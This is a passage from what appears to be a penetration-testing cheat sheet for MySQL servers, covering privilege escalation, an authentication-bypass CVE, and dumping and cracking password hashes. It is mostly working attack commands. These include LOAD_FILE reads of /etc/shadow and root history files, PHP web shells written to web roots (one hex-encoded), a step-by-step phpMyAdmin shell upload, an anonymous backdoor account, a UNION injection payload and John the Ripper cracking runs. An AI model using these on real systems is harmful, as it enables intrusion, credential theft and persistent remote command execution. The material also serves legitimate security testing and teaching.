		|   sql_mode: 
		|   sql_notes: ON
		|   sql_warnings: OFF
		|   ssl_ca: /etc/mysql/cacert.pem
		|   ssl_capath: 
		|   ssl_cert: /etc/mysql/server-cert.pem
		|   ssl_cipher: 
		|   ssl_key: /etc/mysql/server-key.pem
		|   storage_engine: MyISAM
		|   timed_mutexes: OFF
		|   tmp_table_size: 33554432
		|   tmpdir: /tmp
		|   transaction_alloc_block_size: 8192
		|   transaction_prealloc_size: 4096
		|   tx_isolation: REPEATABLE-READ
		|   updatable_views_with_limit: YES
		|   version: 5.0.51a-3ubuntu5
		|   version_comment: (Ubuntu)
		|   version_compile_machine: i486
		|   version_compile_os: debian-linux-gnu
		|_  wait_timeout: 28800		

		
*  Metasploit - 'MYSQL Schema Dump' module
--------------------------------------------------
This module extracts the schema information from a MySQL DB server.

> auxiliary/scanner/mysql/mysql_schemadump
> https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_schemadump



07.2. DB Privesc - Check for accounts with the 'PROCESS'  privilege
==========================================================================================================
The PROCESS privilege can be used to view the plain text of currently executing queries, including queries that set or change passwords.
The output of 'mysqladmin processlist' shows the text of the currently executing queries.
Any user who is allowed to execute that command might be able to see if another user issues an 'UPDATE user SET password=PASSWORD('not_secure')' query.


* Manual check
----------------
	mysql> SELECT * FROM mysql.user;								 																//List the privileges of all users
	mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'PROCESS'; 	//List Accounts with PROCESS privilege


* Manual attack
----------------
pentester@KaliLinux> mysqladmin -h 192.168.1.183 -u root -p processlist -i 1 --verbose			--shows the text of the currently executing queries.
	OR
			  mysql> SHOW FULL PROCESSLIST		
			  mysql> select * from INFORMATION_SCHEMA.PROCESSLIST where db = 'mysql';
			  


07.3. OS/DB Privesc - Check for accounts with the 'FILE' privilege
==========================================================================================================
The FILE privilege gives you permission to read and write files on the server host using the 'LOAD DATA INFILE' and 'SELECT ... INTO OUTFILE' statements and the 'LOAD_FILE()' function.
A user who has the FILE privilege can read any file on the server host that is either world-readable or readable by the MySQL server. 
(This implies the user can read any file in any database directory, because the server can access any of those files.)

Recommendation: use the variable "secure_file_priv" to limit the effect of the data export and import operations.


* Manual check:
----------------
	mysql> SELECT * FROM mysql.user;								 															 //List the privileges of all users
	mysql> SELECT host, user FROM mysql.user WHERE file_priv = 'Y'; 								 							 //List DBA Accounts	
	mysql> SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'FILE'; 	 //List Accounts with FILE privilege


* Manual attack:
----------------

Read files stored on the Linux/Windows server supporting the MySQL database (examples):
	mysql> SELECT LOAD_FILE('/etc/passwd');
	mysql> SELECT LOAD_FILE('/root/.bash_history');
	mysql> SELECT LOAD_FILE('/root/.my.cnf);
	mysql> SELECT LOAD_FILE('/etc/shadow');
	mysql> SELECT LOAD_FILE('/home/msfadmin/.mysql_history');

	mysql> SELECT LOAD_FILE('C:\\tesfile.txt');

  
Upload of a Web Shell on the Linux/Windows server supporting the MySQL database (examples):
	mysql> SELECT <web shell content> INTO DUMPFILE '/path/to/webshell.php'
	mysql> select "<?php system($_GET['cmd']);?>" into outfile "/var/www/dvwa/backdoor1.php"
	mysql> SELECT "< ? $c = $_GET['cmd']; $op = shell_exec($c); echo $op ? >" into OUTFILE "c:\XAMPP\htdocs\shell.php";
	mysql> SELECT '< ? $c = $_GET['cmd']; $op = shell_exec($c); echo $op ? >' into OUTFILE 'c:\\WAMPP\\DWVA\\dwva\\cmd.php';
	mysql> SELECT 0x3C3F706870206563686F20273C7072653E273B696628697373657428245F4745545B27646C275D292966696C655F7075745F636F6E74656E747328626173656E616D6528245F4745545B27646C275D292C66696C655F6765745F636F6E74656E747328245F4745545B27646C275D29293B69662028697373657428245F4745545B27636D64275D292973797374656D28245F4745545B27636D64275D2E2220323E263122293B6563686F20273C2F7072653E273B3F3E INTO DUMPFILE '/path/to/webshell.php'


Upload of a Web Shell using PHPMYADMIN on the Linux/Windows server supporting the MySQL database:
  	- Step 1. Get the web server installation path (DocumenRoot) web root folder. Can be found thanks to "phpinfo.php" or "test.php" or "phpinfo()".
            	Example for WIdnows: XAMP = 'c:\XAMPP\htdocs' or IIS = 'C:\inetpub\wwwroot'
		Example for Linux: Apache = '/var/www'  (conf found in the file '/etc/apache2/sites-available/default')	  

 	- Step 2. Go to PHPMyAdmin console section and then Go to Query/sql tab.
  	- Step 3. Write the following sql query into input text area and submit the query (N.B: The above SQL command will create a shell.php file on the web server)
		    
		SELECT "< ? $c = $_GET['cmd']; $op = shell_exec($c); echo $op ? >" into OUTFILE "c:\XAMPP\htdocs\shell.php";

  	- Step 4. After executing the above command , the shell.php file will be accessible directly, as it was created on web directory.
  	- Step 5. Access the shell.php file from your web browser, http://x.x.x.x/shell.php?cmd=<your_command>


Remarks:
If the plugin directory is writable by the server, it may be possible for a user to write executable code to a file in the directory using SELECT ... INTO DUMPFILE. 
This can be prevented by making plugin_dir read only to the server or by setting --secure-file-priv to a directory where SELECT writes can be made safely.
	
	
* Metasploit - 'MYSQL Directory Write Test' module
----------------------------------------------------------
Enumerate writeable directories using the MySQL 'SELECT INTO DUMPFILE' feature, for more information see the URL in the references. 
Important note: For every writable directory found, a file with the specified FILE_NAME containing the text test will be written to the directory.

> auxiliary/scanner/mysql/mysql_writable_dirs
> https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_writable_dirs


* Metasploit - 'MYSQL File/Directory Enumerator' module
----------------------------------------------------------
Enumerate files and directories using the MySQL load_file feature, for more information see the URL in the references.

> auxiliary/scanner/mysql/mysql_file_enum
> https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_file_enum

* Metasploit 'MySQL for Microsoft Windows Payload Execution' module
------------------------------------------------------------------------------------
This module creates and enables a custom UDF (user defined function) on the target host via the 'SELECT ... into DUMPFILE' method of binary injection. 
On default Microsoft Windows installations of MySQL (=< 5.5.9), directory write permissions not enforced, and the MySQL service runs as LocalSystem. 

Important note: This module will leave a payload executable on the target system when the attack is finished, as well as the UDF DLL, and will define or redefine 'sys_eval()' and 'sys_exec()' functions.

Requirements:
 + You know the password of the root account or of a database user who has the FILE privilege 
 + The function 'lib_mysqludf_sys', is already installed in MySQL

> exploit/windows/mysql/mysql_payload
> https://www.rapid7.com/db/modules/exploit/windows/mysql/mysql_payload


07.4. DB Privesc - CVE-2012-2122 - Remote bypass authentication vulnerabilities
==========================================================================================================

This vulnerability allows remote users to bypass authentication due to improper checking of returned values. 
There is a 1/256 probability of passing the authorization with invalid password, because MySQL believes that the token received from the user and the expected value are equal. 
By using a known user name (such as, 'root', which is virtually always the case) with any password, you can connect to the database by repeating the connection about 300 times. 
However, not everything is as good as it seems, this vulnerability affects only assemblies where 'memcmp()' function returns the values outside the range between '-128' and '127', 
which is quite a limited number of systems:
 + Ubuntu Linux 64-bit (10.04, 10.10, 11.04, 11.10, 12.04);
 + OpenSuSE 12.1 64-bit MySQL 5.5.23-log;
 + Debian Unstable 64-bit 5.5.23-2;
 + Fedora;
 + Arch Linux.


* NMAP - 'mysql-auth-bypass' module (cve-2012-2122)
---------------------------------------------------
pentester@KaliLinux> nmap -v -d --script=mysql-auth-bypass.nse -p 3306 -Pn --script-args="userdb=usernames.txt" 192.168.1.11

	PORT     STATE SERVICE REASON
	3306/tcp open  mysql   syn-ack
	| mysql-auth-bypass:
	|_  user XXX is vulnerable to auth bypass


* Metasploit - 'MySQL Authentication Bypass Password Dump (CVE-2012-2122)' module
---------------------------------------------------------------------------------------
This module exploits a password bypass vulnerability in MySQL in order to extract the usernames and encrypted password hashes from a MySQL server. 
These hashes are stored as loot for later cracking.

> auxiliary/scanner/mysql/mysql_authbypass_hashdump
> https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_authbypass_hashdump



07.5. DB Privesc - Check for EXECUTE priv on stored procedure with a DEFINER set to admin (or any privileged account)
========================================================================================================================
EXECUTE privilege on an insecure MySQL stored procedure vulnerable to SQL injection and with a DEFINER set to admin (or any privileged account)

* Example of a simple INSECURE MySQL stored procedure which is vulnerable to SQL injection:
-------------------------------------------------------------------------------------------
	mysql> USE mysql
	mysql> DELIMITER $$
	mysql> CREATE DEFINER = 'root'@'' PROCEDURE SP_ListDbUser (IN param1 VARCHAR(64))
		BEGIN
		SET @query = CONCAT('select user from',' ',param1);
		PREPARE stmt from @query;
		EXECUTE stmt;
		END $$
	mysql> DELIMITER ;
	
	mysql> GRANT EXECUTE ON PROCEDURE mysql.SP_ListDbUser TO 'auditor'@'%';
	mysql> DROP PROCEDURE mysql.SP_ListDbUser; 

Example of normal query: 
	mysql> CALL SP_ListDbUser ('mysql.db')

	
* Example of an SECURE MySQL stored procedure:
----------------------------------------------
	mysql> USE mysql
	mysql> DELIMITER $$
	mysql> CREATE DEFINER = 'root'@'' PROCEDURE SP_ListDbUser1 (IN param VARCHAR(64))
		BEGIN
		SELECT user FROM mysql.user WHERE Super_priv = param;
		END $$
	mysql> DELIMITER ;
	
	mysql> GRANT EXECUTE ON PROCEDURE mysql.SP_ListDbUser1 TO 'auditor'@'%';
	
	mysql> CALL SP_ListDbUser1('Y');	
	mysql> CALL SP_ListDbUser1('N');
	

* Manual checks
----------------
	mysql> select * from mysql.proc  


* Manual attack to exploit the insecure MySQL stored procedure SP_ListDbUser
----------------------------------------------------------------------------
	mysql> CALL SP_ListDbUser ('mysql.user UNION select password from mysql.user'); 



07.6. DB Privesc - Check for "Proxy users"
===================================================================
The MySQL server authenticates client connections using authentication plugins.
The plugin that authenticates a given connection may request that the connecting (external) user be treated as a different user for privilege-checking purposes.
This enables the external user to be a proxy for the second user; that is, to assume the privileges of the second user:
 + The external user is a “proxy user” (a user who can impersonate or become known as another user).
 + The second user is a “proxied user” (a user whose identity and privileges can be assumed by a proxy user)

Requirements for Proxy User Support
------------------------------------
 + For proxying to occur for a given authentication plugin, these conditions must be satisfied:
 + The plugin must support proxying.
 + The proxy user account must be set up to be authenticated by the plugin. Use the CREATE USER or GRANT statement to associate an account with an authentication plugin.
 + The proxied user account must be created and granted the privileges to be assumed by the proxy user. Use the CREATE USER and GRANT statements for this.
 + The proxy user account must have the PROXY privilege for the proxied account. Use the GRANT statement for this.
 + For a client connecting to the proxy account to be treated as a proxy user, the authentication plugin must return a user name different from the client user name, to indicate
   the user name of the proxied account that defines the privileges to be assumed by the proxy user.

   
Example of queries to create proxy users
----------------------------------------
	mysql> CREATE USER ''@'%' IDENTIFIED BY 'a_password';			//Create an anonymous proxy users = backdoor ;-)
																	//remark:  ''@'%'    =  remote or local anonymous user

	mysql> GRANT PROXY ON 'root'@'localhost' TO 'auditor'@'%';						//the (remote) auditor account can impersonate the (local) root account
	mysql> REVOKE PROXY ON root TO guest;
	mysql> GRANT PROXY ON ''@'' TO 'auditor'@'%' WITH GRANT OPTION; 	//the auditor account has been granted the priv to manage all GRANT PROXY mappings. 		
	
	
* Manual check to identify proxy_users
--------------------------------------
	mysql> SELECT * @@proxy_user;			 //List the proxy users


* Manual attack (to exploit an anonymous proxy user):
----------------------------------------------------- 
To ADD    



07.7. DB Privesc - MySQL authentication capture
===================================================================


*  Metasploit - 'Authentication Capture: MySQL' module
-----------------------------------------------------------
This module provides a fake MySQL service that is designed to capture authentication credentials. 
It captures challenge and response pairs that can be supplied to Cain or JtR for cracking.

> auxiliary/server/capture/mysql
> https://www.rapid7.com/db/modules/auxiliary/server/capture/mysql



======================================================================================================
08. How to dump and crack MySQL password hashes
======================================================================================================

* Manual Password Hashes dump and cracking
===========================================

1. Log into the Database with an account who has 'admin' privileges
	
2. Dump the hashs
	SQL> SELECT user, password FROM mysql.USER; 

3. Crack the password hashes using John the ripper
	pentester@KaliLinux> john --wordlist=dico.txt --rules --format=mysql file-mysql-pwd.txt 
	pentester@KaliLinux> john --format=mysql file-mysql-pwd.txt 
	pentester@KaliLinux> john --show file-mysql-pwd.txt 
	

* Automatic Password Hashes dump 
==========================================

1. NMAP - 'mysql-dump-hashes' module
----------------------------------------
Dumps the password hashes from an MySQL server in a format suitable for cracking by tools such as John the Ripper. Appropriate DB privileges (root) are required.

> nmap -p 3306 192.168.0.125 --script mysql-dump-hashes --script-args='username=root,password=secret'

	PORT     STATE SERVICE
	3306/tcp open  mysql
	| mysql-dump-hashes:
	|   root:*9B500343BC52E2911172EB52AE5CF4847604C6E5
	|   <SNIP>


2. Metasploit - 'MYSQL Password Hashdump' module
-----------------------------------------------------------
This module extracts the usernames and encrypted password hashes from a MySQL server and stores them for later cracking.

> https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_hashdump
> auxiliary/scanner/mysql/mysql_hashdump



=====================================================================================
MySQL miscellaneous notes
=====================================================================================

cat /root/.my.cnf

mysql> GRANT FILE ON *.* TO 'mysql_user'@'hostname';
mysql> REVOKE FILE ON *.* TO 'mysql_user'@'hostname';

Do not ever give anyone (except the mysql root user) access to the user table in the mysql database! This is critical. 
The encrypted password is the real password in MySQL. 
Anyone who knows the password which is listed in the user table and has access to the host listed for the account can easily log in as that user.

shell> mysql -u root -p --execute="SELECT User, Host, Password FROM mysql.user"


shell> mysql -u root mysql
   mysql> use mysql;
   mysql> CREATE USER ''@'%' IDENTIFIED BY 'anonymous';
   mysql> CREATE USER ''@'' IDENTIFIED BY 'anonymous';
   mysql> UPDATE user SET Password=PASSWORD('guest') WHERE user='guest';
   mysql> UPDATE user SET Password=PASSWORD('new_password') WHERE user='root';
   mysql> CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'newpass';
   mysql> SELECT User, Host, Password FROM mysql.user;
   mysql> FLUSH PRIVILEGES;
   mysql> select * from user;


 > USER(): the application user, or a combination of the application user name and the application host name.

 > @@EXTERNAL_USER: the non-MySQL related user id that was used by the plugin to authenticate. Plugin specific.

 > CURRENT_USER():
if proxying was used this is the selected proxy user account
if no proxying was used this is the selected authentication user account

> @@PROXY_USER
if proxying was used this is the authentication user account
if not proxying was used it’s empty (NULL)
   
Edit /etc/mysql/my.cnf, find the line which says:
bind-address = 0.0.0.0

And restart MySQL:
> sudo /etc/init.d/mysql restart


METASPLOIT
==========================

Oracle MySQL for Microsoft Windows FILE Privilege Abuse
> https://www.rapid7.com/db/modules/exploit/windows/mysql/mysql_start_up
> This module takes advantage of a file privilege misconfiguration problem specifically against Windows MySQL servers. 
> This module abuses the FILE privilege to write a payload to Microsoft's All Users Start Up directory which will execute every time a user logs in. 
> The default All Users Start Up directory used by the module is present on Windows 7.

MySQL Create Database Privilege Escalation Vulnerability (mysql version < 4_1_21)
> Certain versions of MySQL contain implementation flaws that allow an authenticated user to bypass restrictions and create databases, or to elevate privileges by executing an SUID routine.
> https://www.rapid7.com/db/vulnerabilities/mysql-create-database-privilege-escalation

Other:
nmap -p 3306 -v -v --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.0.125

MySQL implements non-standard SQL.
